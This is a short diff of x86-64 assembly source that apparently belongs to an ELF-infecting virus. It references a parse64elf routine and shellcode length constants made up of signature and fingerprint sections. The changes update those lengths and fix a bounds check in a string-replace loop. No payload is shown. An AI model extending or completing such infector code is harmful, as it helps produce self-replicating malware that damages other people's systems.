@@ -1718,9 +1718,9 @@ push rdx
 	NOP
 retn
 
-%define SHELLCODE_LEN 9521 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 9353 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 9348 
+%define SHELLCODE_LEN 9530 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 9362 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 9357 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	NOP
@@ -3274,12 +3274,15 @@ ft_str_replace:
 	NOP
 	xor rax, rax; int i = 0 
 	fsr_loop:
-	;check if we're at the end
-	cmp rax, r10
-	je fsr_loop_exit ; we reached end of base
 
 	mov rbx, 0; int j = 0;
 	fsr_inloop: ; let's check if we can find the str to_replace
+	;check if we're at the end
+	add rax, rbx
+	cmp rax, r10
+	je fsr_loop_exit ; we reached end of base
+	sub rax, rbx
+
 	mov r11b, [rsi + rbx]
 	cmp r11b, 0x60
 	jne fsr_inloop_cont
